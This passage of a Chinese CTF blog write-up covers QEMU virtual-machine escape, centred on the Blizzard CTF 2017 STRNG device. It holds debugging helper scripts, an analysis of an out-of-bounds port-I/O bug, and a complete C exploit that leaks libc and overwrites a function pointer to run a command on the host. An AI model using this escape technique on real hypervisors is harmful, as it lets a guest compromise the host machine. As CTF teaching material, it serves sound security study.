  cpio_file="${cpio_file%.gz}"
fi

# 解压cpio文件
echo "Extracting $cpio_file to file system..."
cpio -idmv <"$cpio_file"
rm "$cpio_file"
echo "Extraction complete."
```

```bash title="compress_fs"
#!/bin/sh

if [[ $# -ne 1 ]]; then
  echo "Usage: $0 cpio_path"
  exit 1
fi

cpio_file="../$1"

find . -print0 |
  cpio --null -ov --format=newc |
  gzip -9 >"$cpio_file"
```

#### gdb.sh

用于 docker 里一键起 gdb attach 到 qemu 然后调试

```bash
#!/bin/sh
PID=$(ps -a | grep qemu | awk '{print $1}')

if [ -z "$PID" ]; then
    echo "No qemu process found"
    exit 1
fi

gdb -p $PID -x gdbscript
```

附赠个 gdbscript

```gdbscript
# b ccb_dev_mmio_read
b *$rebase(0x5798b1)
c
```

#### docker

起调试用 docker 的指令

```bash
docker run -it -v .:/mnt --rm --privileged nopwnv2:18.04
```



## Stage2: Simple OOB with PMIO - Blizzard CTF 2017 / STRNG

> 题目附件：[rcvalle/blizzardctf2017: Blizzard CTF 2017: Sombra True Random Number Generator (STRNG).](https://github.com/rcvalle/blizzardctf2017)

上面那题在当时看了洋爹的 exp，因此不太有自我思考的成分在。我们从零做个经典的。



拿到一个 tar 包，结果他没有启动参数，也没有用 docker。一看 github 是 ubuntu14.04 的环境。哈哈，你看这事闹得。但是尝试了一下它的命令还是能起起来的， 那就在我 Arch 上跑了。



直接丢 ida 研究一下，有符号，直接搜题目名字看看，直接一眼顶针了。

![image-20250512163919166](https://cdn.nova.gal/img/image-20250512163919166.png)

 但是这个不好看，显然是因为这里是 ObjectClass 的原因，给他修一下改成 PCIDeviceClass。

![image-20250512164422658](https://cdn.nova.gal/img/image-20250512164422658.png)

自然对应我们 `lspci -v` 里的这个设备

```bash
00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)
        Subsystem: Red Hat, Inc Device 1100
        Physical Slot: 3
        Flags: fast devsel
        Memory at febf1000 (32-bit, non-prefetchable) [size=256]
        I/O ports at c050 [size=8]
```

拿到了 PMIO 的 baseaddr 0xc050



回到 ida，我们看看 pmio/mmio 的 read/write 函数，记得把第一个 opaque 修一下类型，具体类型也可以在 Local Type 里面找到，是 `STRNGState *`

在 mmio_write 中发现我们可以设置 rand 种子，然后也可以利用 rand 函数生成随机数存进去，还有一个 rand_r 函数，它的参数来自于 `opaque->regs[2]`，也是可以通过这里可控的。同时，我们可以往 opaque->regs[addr >> 2] 的地方写一个 val，这个看着就是越界写哈。

那么思路很有可能就是修改 rand 指针，他传入的第一个参数是 opaque，那么如果开头存了 /bin/sh 就可以；不然就是改 rand_r 指针，因为它的参数我们更好控制，因为 regs[2] 是我们合法就能写的。



mmio_read 可以读 `opaque->regs[addr >> 2]`，看着就是有个越界读哈，又来美美泄露 libc 咯

pmio_read 也是一样，唯一的区别在于它的 addr 是 `opaque->addr`

pmio_write 长得和 mmio_write 很像，但是限制更少一些，并且也没有类型转换，可以直接用 `(_DWORD)(opaque->addr >> 2)` 当下标，然后直接写 val。在 mmio_write 里， 它会写在 `(int)(addr >> 2)` 上



那为啥不直接用 mmio 呢，我寻思也妹区别啊？例如我们读一个 `srand`

```c
int srand_addr = mmio_read(65<<2);
printf("srand_addr = %x\n", srand_addr);
```

然后发现有生殖隔离，这 ubuntu14.04 实在是太高版本了。还好它的里面自带 gcc，那就把 exp.c 传过去，然后在那 gcc 编译。



结果我们发现完全断不到 mmio_read 函数上，并且 srand_addr 也是 0。当我们把它地址改到 regs 的其他地方，它又可以了。



显然是有高水平的东西在作怪，观察 realize 函数我们可以发现，它在 memory_region_init 的时候，竟然设置了大小为 **256**，显然，qemu 在这里存在一个检查，让我们没有办法越界访问。

![image-20250512174042840](https://cdn.nova.gal/img/image-20250512174042840.png)

因此我们得使用 pmio，因为正如上文分析的，pmio 用的是 `opaque->addr`，而这个东西是我们可以控制的。

![image-20250512174211402](https://cdn.nova.gal/img/image-20250512174211402.png)

那么就是用 PMIO 来打咯。

:::warning 注意

在运行前，我们需要调用 `iopl(3)` 去允许用户态（即 RING3）访问 io 端口。我们也可以用 `ioperm` 去允许单个端口。

see [ioperm(2) - Linux manual page](https://www.man7.org/linux/man-pages/man2/ioperm.2.html), [iopl(2) - Linux manual page](https://www.man7.org/linux/man-pages/man2/iopl.2.html), [outb(2) - Linux manual page](https://man7.org/linux/man-pages/man2/outb.2.html)

:::

```c
int main()
{
    if(iopl(3)!=0){perror("iopl failed");exit(-1);}

    pmio_write(0, 65 << 2);
    int srand_addr = pmio_read(4);
    printf("srand_addr = %x\n", srand_addr);

    return 0;
}
```

 ```c
 srand_addr = a49c7ba0
 ```

轻松写意了有点，继续把高位泄露，然后传参即可。

有个坑点，它这个环境用 uint64_t 不能搞到 64bit，而是 32bit，不知道为啥，反正最后用了 long long 才行。



但是有个问题，我们知道 rand_r 第一个参数是 `&regs[2]`，也就意味着我们如果写 `/bin/sh` 的话必然会碰到 `regs[3]`，但是在 pmio 中并不能设置 `regs[3]`，它会直接调用 `rand_r`， 因此我们还需要把 mmio 也接上。

> 实际上，我们似乎也可以直接用 `sh`，从而避免这个问题。



由于它是 ssh 的，不太好搞，因此我写成了 `cat flag` 来拿宿主机的 flag



### exp

```c
#include <sys/io.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sys/types.h>

unsigned char* mmio_mem;
uint32_t pmio_base=0xc050;

void die(const char* msg)
{
    perror(msg);
    exit(-1);
}

void mmio_write(uint32_t addr,uint32_t value)
{
    *((uint32_t *)(mmio_mem+addr)) = value;
}

uint32_t mmio_read(uint32_t addr)
{
    return *((uint32_t*)(mmio_mem+addr));
}

void pmio_write(uint32_t addr,uint32_t value)
{
    outl(value,pmio_base + addr);
}

uint32_t pmio_read(uint32_t addr)
{
    return (uint32_t)(inl(pmio_base + addr));
}

int main()
{
    if(iopl(3)!=0){perror("iopl failed");exit(-1);}

    pmio_write(0, 65 << 2);
    uint32_t low_bits = pmio_read(4);
    pmio_write(0, 66 << 2);
    uint32_t upper_bits = pmio_read(4);
    long long srand_addr = ((long long)upper_bits << 32) | ((long long)low_bits & 0xFFFFFFFF);
    printf("srand_addr = 0x%llx\n", srand_addr);

    long long libc_base = srand_addr - 0x43ba0;
    long long system_addr = libc_base + 0x403860;
    long long binsh_addr = libc_base + 0x1b3d88;
    printf("libc_base = 0x%llx\n", libc_base);
    printf("system_addr = 0x%llx\n", system_addr);
    printf("binsh_addr = 0x%llx\n", binsh_addr);

    // binsh
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:03.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        die("mmio_fd open failed");

    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        die("mmap mmio_mem failed");

    printf("mmio_mem @ %p\n", mmio_mem);

    // system
    pmio_write(0, 69 << 2);
    pmio_write(4, system_addr & 0xFFFFFFFF);
    pmio_write(0, 70 << 2);
    pmio_write(4, (system_addr >> 32) & 0xFFFFFFFF);

    // binsh
    int binsh[2];
    memcpy(binsh, "cat flag", 8);
    mmio_write(2 << 2, binsh[0]);
    mmio_write(3 << 2, binsh[1]);

    // call system
    mmio_write(3 << 2, binsh[1]);

    return 0;
}

```

### attachs

#### compile.sh

用了 sshpass 来传

```bash
#!/bin/sh

sshpass -p "passw0rd" scp -P 5555 /mnt/exp.c ubuntu@localhost:/home/ubuntu/exp.c
sshpass -p "passw0rd" ssh -p 5555 ubuntu@localhost "cd /home/ubuntu && gcc -w -s -static -o3 exp.c -o exp"
sshpass -p "passw0rd" scp -P 5555 ubuntu@localhost:/home/ubuntu/exp .
```



## References

[虚拟机逃逸初探(更新中) - l0tus' blog](https://l0tus.vip/cn/qemu_escape/)

[Qemu逃逸初识 | S1nec-1o's B1og](https://s1nec-1o.github.io/2025/05/04/Qemu逃逸初识/index.html)
